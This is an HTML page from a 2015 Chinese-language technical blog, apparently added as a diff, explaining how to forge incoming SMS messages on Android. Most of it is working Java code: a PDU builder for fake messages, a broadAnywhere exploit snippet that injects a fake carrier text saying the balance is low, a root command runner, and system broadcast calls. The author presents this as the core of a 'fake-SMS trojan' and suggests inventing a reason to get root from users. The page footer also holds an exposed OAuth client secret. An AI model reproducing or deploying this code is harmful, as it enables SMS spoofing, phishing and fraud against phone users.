@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+
+    
+
+    
+
+    <title>Android通过代码伪造短信 | 吃瓜笔记</title>
+    <meta name="author" content="Noverguo">
+    <meta name="version" content="1.0.0">
+    <meta name="keywords" content="Android、Java、ByteCode、ASM、Hack、Nodejs、">
+    <meta name="description" content="声明：本文只作技术探讨，禁止用于非法用途。前言伪造短信浅谈一文中，简单地分析了伪造短信的各种方案。今天，就谈一谈如何在Android中通过代码伪造短信。前面说过，这个方案有个比较大的限制——需要非常高的系统权限，如root、system。如果手机已经root，那当然非常好办，找个合理的理由告诉用户需要root权限即可。但对于大部分小白用户来说，他们的手机一般没进行root。为了拿到高的系统权限，并且兼容性高，覆盖范围广，我们可以选择利用一些通用的漏洞。最早在2012年时，就已经爆出...">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+
+    
+    <link rel="alternate" href="/atom.xml" title="吃瓜笔记" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/images/favicon.ico">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+
+    <main class="app">
+        <header class="header clearfix">
+    <div id="nav" class="nav">
+    <div class="nav-mobile">
+        <button id="open-panel" class="open-panel nav-mobile-item"><i class="icon-documents"></i></button>
+        <h1 class="nav-mobile-title nav-mobile-item">吃瓜笔记</h1>
+        <button id="open-menus" class="open-panel nav-mobile-item"><i class="icon-library"></i></button>
+    </div>
+
+    <nav id="nav-inner" class="nav-inner">
+        
+            <a class="nav-item" href="/">
+                <span class="nav-text">首页</span>
+            </a>
+        
+            <a class="nav-item" href="/categories/asm">
+                <span class="nav-text">ASM</span>
+            </a>
+        
+            <a class="nav-item" href="/categories/android">
+                <span class="nav-text">Android</span>
+            </a>
+        
+            <a class="nav-item" href="/archives">
+                <span class="nav-text">归档</span>
+            </a>
+        
+    </nav>
+</div>
+
+    <aside id="aside" class="aside">
+    <div id="aside-mask" class="aside-mask"></div>
+    <div id="aside-inner" class="aside-inner">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit"><i class="icon-search-stroke"></i></button><input type="hidden" name="sitesearch" value="http://noverguo.github.io"></form>
+
+        
+        
+        
+        
+
+        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fakesms漏洞与pdu数据"><span class="toc-number">2.</span> <span class="toc-text">fakesms漏洞与pdu数据</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#broadAnywhere漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">broadAnywhere漏洞利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#root漏洞利用"><span class="toc-number">4.</span> <span class="toc-text">root漏洞利用</span></a></li></ol>
+        
+    </div>
+</aside>
+
+</header>
+
+        <div id="content" class="content"><article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            Android通过代码伪造短信
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="http://noverguo.github.io/2015/09/28/sms02/index.html">
+    
+    <i class="icon-calendar"></i>
+    
+    <time datetime="2015-09-28T00:00:00.000Z" itemprop="datePublished">2015-09-28</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag"></i>
+    <a class="article-tag-link" href="/tags/伪造短信/">伪造短信</a>, <a class="article-tag-link" href="/tags/短信安全/">短信安全</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>声明：本文只作技术探讨，禁止用于非法用途。</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><a href="/2015/09/23/sms01/" title="伪造短信浅谈">伪造短信浅谈</a>一文中，简单地分析了伪造短信的各种方案。今天，就谈一谈如何在Android中通过代码伪造短信。
+
+<p>前面说过，这个方案有个比较大的限制——需要非常高的系统权限，如root、system。如果手机已经root，那当然非常好办，找个合理的理由告诉用户需要root权限即可。但对于大部分小白用户来说，他们的手机一般没进行root。为了拿到高的系统权限，并且兼容性高，覆盖范围广，我们可以选择利用一些通用的漏洞。</p>
+<p>最早在2012年时，就已经爆出Android4.0原生短信app的漏洞：<a href="http://www.freebuf.com/articles/terminal/6169.html" target="_blank" rel="noopener">对Android最新fakesms漏洞的分析</a>。这漏洞影响的平台在1.6<del>4.1，但直至2015年9月，根据<a href="http://developer.android.com/about/dashboards/index.html" target="_blank" rel="noopener">Google最新的版本分布统计</a>，4.1</del>5.1才是现今的主流。也就是说，我们还需要找各种漏洞进行各版本的适配，才能兼容大部分设备，这也是伪造短信木马的难点之一。</p>
+<a id="more"></a>
+<h1 id="fakesms漏洞与pdu数据"><a href="#fakesms漏洞与pdu数据" class="headerlink" title="fakesms漏洞与pdu数据"></a>fakesms漏洞与pdu数据</h1><p>做Android开发的应该都知道，短信app接收短信的原理在于拦截短信到来的广播，并解释pdu数据来获取发送者与内容等信息。</p>
+<p>典型的短信拦截代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SMSReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"android.provider.Telephony.SMS_RECEIVED"</span>.equals(intent.getAction())) &#123;</span><br><span class="line">            Bundle bundle = intent.getExtras();</span><br><span class="line">            Object messages[] = (Object[]) bundle.get(<span class="string">"pdus"</span>);</span><br><span class="line">            SmsMessage smsMessage[] = <span class="keyword">new</span> SmsMessage[messages.length];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; messages.length; i++) &#123;</span><br><span class="line">                smsMessage[i] = SmsMessage.createFromPdu((<span class="keyword">byte</span>[]) messages[i]);</span><br><span class="line">                <span class="comment">// 发送者</span></span><br><span class="line">                smsMessage[i].getOriginatingAddress();</span><br><span class="line">                <span class="comment">// 短信内容</span></span><br><span class="line">                smsMessage[i].getMessageBody();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.abortBroadcast();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说，只要我们能模拟发送短信到来的广播，并填入对应的pdu数据，短信app就会认为有新的短信到来了。</p>
+<p>在对Android最新fakesms漏洞的分析一文中，给出了对应的利用代码，其中就包含生成pdu的功能。不过这生成pdu代码还有些Bug：</p>
+<ul>
+<li>不支持中文</li>
+<li>短信内容不能过长。</li>
+</ul>
+<p>下面给出修复后的代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 短信Intent构造工具</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SmsUtils</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取对应的Intent数据</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Intent <span class="title">getSmsIntent</span><span class="params">(String number, String body)</span> </span>&#123;</span><br><span class="line">        SmsManager smsManager = SmsManager.getDefault();</span><br><span class="line">        <span class="comment">// 防止短信过长</span></span><br><span class="line">        ArrayList&lt;String&gt; messages = smsManager.divideMessage(body);</span><br><span class="line">        <span class="keyword">int</span> size = messages.size();</span><br><span class="line">        Object[] objArray = <span class="keyword">new</span> Object[size];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] pduu = createFakeSms(number, messages.get(i));</span><br><span class="line">            objArray[i] = pduu;</span><br><span class="line">        &#125;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">        intent.setAction(<span class="string">"android.provider.Telephony.SMS_RECEIVED"</span>);</span><br><span class="line">        intent.putExtra(<span class="string">"pdus"</span>, objArray);</span><br><span class="line">        intent.putExtra(<span class="string">"format"</span>, <span class="string">"3gpp"</span>);</span><br><span class="line">        intent.putExtra(<span class="string">"subscription"</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> intent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建pdu</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] createFakeSms(String sender, String body) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] pdu = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] scBytes = PhoneNumberUtils.networkPortionToCalledPartyBCD(<span class="string">"0000000000"</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] senderBytes = PhoneNumberUtils.networkPortionToCalledPartyBCD(sender);</span><br><span class="line">        <span class="keyword">int</span> lsmcs = scBytes.length;</span><br><span class="line">        <span class="comment">// 时间处理，包括年月日时分秒以及时区和夏令时</span></span><br><span class="line">        <span class="keyword">byte</span>[] dateBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">7</span>];</span><br><span class="line">        Calendar calendar = <span class="keyword">new</span> GregorianCalendar();</span><br><span class="line">        dateBytes[<span class="number">0</span>] = reverseByte((<span class="keyword">byte</span>) (calendar.get(Calendar.YEAR)));</span><br><span class="line">        dateBytes[<span class="number">1</span>] = reverseByte((<span class="keyword">byte</span>) (calendar.get(Calendar.MONTH) + <span class="number">1</span>));</span><br><span class="line">        dateBytes[<span class="number">2</span>] = reverseByte((<span class="keyword">byte</span>) (calendar.get(Calendar.DAY_OF_MONTH)));</span><br><span class="line">        dateBytes[<span class="number">3</span>] = reverseByte((<span class="keyword">byte</span>) (calendar.get(Calendar.HOUR_OF_DAY)));</span><br><span class="line">        dateBytes[<span class="number">4</span>] = reverseByte((<span class="keyword">byte</span>) (calendar.get(Calendar.MINUTE)));</span><br><span class="line">        dateBytes[<span class="number">5</span>] = reverseByte((<span class="keyword">byte</span>) (calendar.get(Calendar.SECOND)));</span><br><span class="line">        dateBytes[<span class="number">6</span>] = reverseByte((<span class="keyword">byte</span>) ((calendar.get(Calendar.ZONE_OFFSET) </span><br><span class="line">                    + calendar.get(Calendar.DST_OFFSET)) / (<span class="number">60</span> * <span class="number">1000</span> * <span class="number">15</span>)));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ByteArrayOutputStream bo = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            bo.write(lsmcs);<span class="comment">// 短信服务中心长度</span></span><br><span class="line">            bo.write(scBytes);<span class="comment">// 短信服务中心号码</span></span><br><span class="line">            bo.write(<span class="number">0x04</span>);</span><br><span class="line">            bo.write((<span class="keyword">byte</span>) sender.length());<span class="comment">// 发送方号码长度</span></span><br><span class="line">            bo.write(senderBytes);<span class="comment">// 发送方号码</span></span><br><span class="line">            bo.write(<span class="number">0x00</span>);<span class="comment">// 协议标示，00为普通GSM，点对点方式</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                String className = <span class="string">"com.android.internal.telephony.GsmAlphabet"</span>;</span><br><span class="line">                Class&lt;?&gt; clazz = Class.forName(className);</span><br><span class="line">                Method method = clazz.getMethod(<span class="string">"stringToGsm7BitPacked"</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;);</span><br><span class="line">                method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                <span class="keyword">byte</span>[] bodybytes = (<span class="keyword">byte</span>[]) method.invoke(<span class="keyword">null</span>, body);</span><br><span class="line"></span><br><span class="line">                bo.write(<span class="number">0x00</span>); <span class="comment">// encoding: 0 for default 7bit</span></span><br><span class="line">                bo.write(dateBytes);</span><br><span class="line">                bo.write(bodybytes);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="comment">// 下面是UCS-2编码的处理，中文短信就需要用此种方式</span></span><br><span class="line">                <span class="keyword">byte</span>[] bodyBytes = encodeUCS2(body, <span class="keyword">null</span>);</span><br><span class="line">                bo.write(<span class="number">0x08</span>); <span class="comment">// encoding: 8 for UCS-2</span></span><br><span class="line">                bo.write(dateBytes);</span><br><span class="line">                bo.write(bodyBytes);<span class="comment">// 其中encodeUCS2是从系统中复制过来的，并不是我写的</span></span><br><span class="line">                <span class="comment">// 源码具体位置在</span></span><br><span class="line">                <span class="comment">// frameworks/base/telephony/java/com/android/internal/telephony/gsm/SmsMessage.java</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            pdu = bo.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pdu;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">reverseByte</span><span class="params">(<span class="keyword">byte</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">byte</span>) ((b &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span> | (b &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] encodeUCS2(String message, <span class="keyword">byte</span>[] header) <span class="keyword">throws</span> UnsupportedEncodingException &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] userData, textPart;</span><br><span class="line">        textPart = message.getBytes(<span class="string">"utf-16be"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (header != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// Need 1 byte for UDHL</span></span><br><span class="line">            userData = <span class="keyword">new</span> <span class="keyword">byte</span>[header.length + textPart.length + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            userData[<span class="number">0</span>] = (<span class="keyword">byte</span>) header.length;</span><br><span class="line">            System.arraycopy(header, <span class="number">0</span>, userData, <span class="number">1</span>, header.length);</span><br><span class="line">            System.arraycopy(textPart, <span class="number">0</span>, userData, header.length + <span class="number">1</span>, textPart.length);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            userData = textPart;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">byte</span>[] ret = <span class="keyword">new</span> <span class="keyword">byte</span>[userData.length + <span class="number">1</span>];</span><br><span class="line">        ret[<span class="number">0</span>] = (<span class="keyword">byte</span>) (userData.length &amp; <span class="number">0xff</span>);</span><br><span class="line">        System.arraycopy(userData, <span class="number">0</span>, ret, <span class="number">1</span>, userData.length);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="broadAnywhere漏洞利用"><a href="#broadAnywhere漏洞利用" class="headerlink" title="broadAnywhere漏洞利用"></a>broadAnywhere漏洞利用</h1><p>生成pdu的功能解决了，接下来我们来看下如何发送广播了。短信到来的广播需要system以上的权限才能发送，因此我们需要找一些可以拿到system以上权限的漏洞。拿到System权限的漏洞很多，如<a href="broadanywhere-bug">broadAnywhere漏洞</a>就可以以系统权限发送广播。</p>
+<p>具体利用代码与对应的漏洞相关，如使用broadAnywhere漏洞的关键代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Bundle <span class="title">addAccount</span><span class="params">(AccountAuthenticatorResponse response, String accountType, </span></span></span><br><span class="line"><span class="function"><span class="params">                String authTokenType, String[] requiredFeatures, Bundle options)</span> </span>&#123;</span><br><span class="line">    PendingIntent pendingIntent = (PendingIntent) options.get(<span class="string">"pendingIntent"</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        pendingIntent.send(getGlobalApplicationContext(), <span class="number">0</span>, </span><br><span class="line">            SmsUtils.getSmsIntent(<span class="string">"10086"</span>, <span class="string">"您的余额不足."</span>), <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (CanceledException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Bundle();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="root漏洞利用"><a href="#root漏洞利用" class="headerlink" title="root漏洞利用"></a>root漏洞利用</h1><p>当然，除了使用漏洞外，也可以直接使用已root的手机中的root权限（得找个适合的理由），或者直接利用漏洞先root再使用。root漏洞很多，这里给个参考吧：<a href="https://docs.google.com/spreadsheets/d/13GXrCL9Q-V-pOKQThSKnS03SSuDe4hVRDfr9FZQIHO8/pub" target="_blank" rel="noopener">root漏洞集</a></p>
+<p>典型的root使用代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">runByRoot</span><span class="params">(String... cmds)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Process process = Runtime.getRuntime().exec(<span class="string">"su"</span>);</span><br><span class="line">    DataOutputStream os = <span class="keyword">new</span> DataOutputStream(process.getOutputStream());</span><br><span class="line">    <span class="keyword">for</span>(String cmd : cmds) &#123;</span><br><span class="line">        os.writeBytes(cmd);</span><br><span class="line">        os.writeBytes(<span class="string">"\n"</span>);</span><br><span class="line">        os.flush();</span><br><span class="line">    &#125;</span><br><span class="line">    os.writeBytes(<span class="string">"exit\n"</span>);</span><br><span class="line">    os.flush();</span><br><span class="line">    os.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用root需要执行本地应用，这里有二种选择：<br>    - 自己构造出相应的Context对象，然后调用<figure class="highlight plain"><figcaption><span>intent)```方法。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    - 直接深入```Context.sendBroadcast(Intent intent)```方法的源码中找切入点。</span><br><span class="line"></span><br><span class="line">通过查看Android4.2的源码可以发现，```Context.sendBroadcast(Intent intent)```方法最终调用了```ActivityManagerProxy.broadcastIntent(...)```方法，其实现代码如下：</span><br><span class="line">```java</span><br><span class="line">public int broadcastIntent(IApplicationThread caller, Intent intent, String resolvedType, </span><br><span class="line">        IIntentReceiver resultTo, int resultCode, String resultData, Bundle map, String requiredPermission,</span><br><span class="line">        boolean serialized, boolean sticky, int userId) throws RemoteException &#123;</span><br><span class="line">    Parcel data = Parcel.obtain();</span><br><span class="line">    Parcel reply = Parcel.obtain();</span><br><span class="line">    data.writeInterfaceToken(IActivityManager.descriptor);</span><br><span class="line">    data.writeStrongBinder(caller != null ? caller.asBinder() : null);</span><br><span class="line">    intent.writeToParcel(data, 0);</span><br><span class="line">    data.writeString(resolvedType);</span><br><span class="line">    data.writeStrongBinder(resultTo != null ? resultTo.asBinder() : null);</span><br><span class="line">    data.writeInt(resultCode);</span><br><span class="line">    data.writeString(resultData);</span><br><span class="line">    data.writeBundle(map);</span><br><span class="line">    data.writeString(requiredPermission);</span><br><span class="line">    data.writeInt(serialized ? 1 : 0);</span><br><span class="line">    data.writeInt(sticky ? 1 : 0);</span><br><span class="line">    data.writeInt(userId);</span><br><span class="line">    mRemote.transact(BROADCAST_INTENT_TRANSACTION, data, reply, 0);</span><br><span class="line">    reply.readException();</span><br><span class="line">    int res = reply.readInt();</span><br><span class="line">    reply.recycle();</span><br><span class="line">    data.recycle();</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这是一段明显的binder通信代码，因此我们可以直接模拟binder通信。模拟binder通信有两种选择：</p>
+<ul>
+<li>编写C/C++代码通过模拟binder通信来发送广播，然后直接编译生成可执行文件，</li>
+<li>编写Java代码模拟binder通信来发送广播，然后编译生成.dex文件，并用app_process命令来启动。</li>
+</ul>
+<p>模拟binder通信方案相对比较麻烦，当然借鉴下源码实现也不复杂。但如果想写个demo测试的话，比较简单的方式是直接调用对应的Java接口。<br>查源码发现，上述方法是由<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">```java</span><br><span class="line">static public void broadcastStickyIntent(Intent intent, String permission, int userId) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        getDefault().broadcastIntent(null, intent, null, null, Activity.RESULT_OK, </span><br><span class="line">                null, null, null /* permission */, false, true, userId);</span><br><span class="line">    &#125; catch (RemoteException ex) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>不知大家注意到了没，这是个public static方法，也就是说可以直接调用。而且它只能一行代码，且<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">```java</span><br><span class="line">// ActivityManagerNative.broadcastStickyIntent(SmsUtils.getSmsIntent(number, body), null, -1);</span><br><span class="line">ActivityManagerNative.getDefault().broadcastIntent(null, SmsUtils.getSmsIntent(number, body), </span><br><span class="line">                null, null, Activity.RESULT_OK, null, null, null, false, true, -1);</span><br></pre></td></tr></table></figure></p>
+<p>遗憾的是，这种方案需要针对各系统版本进行适配，原因有二：<br>    - ActivityManagerNative是不公开的，其API经常变动。<br>    - 在Android4.4版本后对拦截短信功能进行了限制，需要接管短信app才能进行拦截，因此发送短信来到广播时，需要指定对应的短信app来进行发送。这点改变就意味着之后系统版本的短信功能还可能会改动，增加了适配的难度。</p>
+<p>这种方案虽代码简单（只有一行），但适配繁琐。想通用的话就只能自己构造出Context对象，然后直接使用如下代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Context.sendBroadcast(SmsUtils.getSmsIntent(number, body));</span><br></pre></td></tr></table></figure>
+
+<p>不过构建Context对象相对复杂，且4.4以上同样需要针对性的适配，有这方面的需要的童鞋可以自己去尝试下。</p>
+<p>至此，本文已经结束，如果有什么问题或者建议，可在评论区留言。</p>
+
+        
+    </section>
+</article>
+
+
+
+<div class="comments">
+    <div id="comments"></div>
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+    new Gitalk({
+        clientID: "3b0fec87adc210be5c53",
+        clientSecret: "20204fc5d8a6988ef125a8057fc5073ad5f0a0f0",
+        repo: "noverguo.github.io",
+        owner: "noverguo",
+        admin: ["noverguo"],
+        id: "2015/09/28/sms02",
+        distractionFreeMode: true,
+        title: "Android通过代码伪造短信",
+        body: "http://noverguo.github.io/2015/09/28/sms02/",
+        labels: ["伪造短信","短信安全"]
+    }).render('comments');
+    </script>
+</div>
+
+</div>
+        <footer class="footer">
+    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, Theme by <a href="https://github.com/sanonz/hexo-theme-concise" target="_blank">Concise</a>
+
+    
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?477943ae26be21251c9ee3fdca3ed5bd";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+    
+</footer>
+
+    </main>
+
+    <script type="text/javascript" src="https://cdn.bootcss.com/jquery/1.9.0/jquery.min.js"></script>
+    <script type="text/javascript">
+    $(function() {
+        var nodes = {
+            nav: $('#nav'),
+            aside: $('#aside'),
+            asideInner: $('#aside-inner'),
+            navInner: $('#nav-inner')
+        };
+
+        var doing = false;
+        nodes.asideInner.on('webkitAnimationEnd mozAnimationEnd oAnimationEnd oanimationend animationend', function() {
+            if (nodes.aside.hasClass('mobile-open')) {
+                nodes.aside.removeClass('mobile-open');
+            } else {
+                nodes.aside.removeClass('mobile-close panel-show');
+            }
+            doing = false;
+        });
+        $('#open-panel, #aside-mask').on('click', function() {
+            if (doing) {
+                return;
+            }
+            
+            if (nodes.aside.hasClass('panel-show')) {
+                nodes.aside.addClass('mobile-close');
+            } else {
+                nodes.aside.addClass('mobile-open panel-show');
+            }
+        });
+        $('#open-menus').on('click', function() {
+            nodes.navInner.slideToggle();
+        });
+
+        if (window.innerWidth <= 960) {
+            setTimeout(function() {
+                nodes.navInner.slideUp();
+            }, 3000);
+        }
+    });
+    </script>
+    
+        <script type="text/javascript" src="/js/scrollspy.min.js"></script>
+        <script type="text/javascript">
+        $(document.body).scrollspy({target: '#aside-inner'});
+        </script>
+    
+
+</body>
+</html>
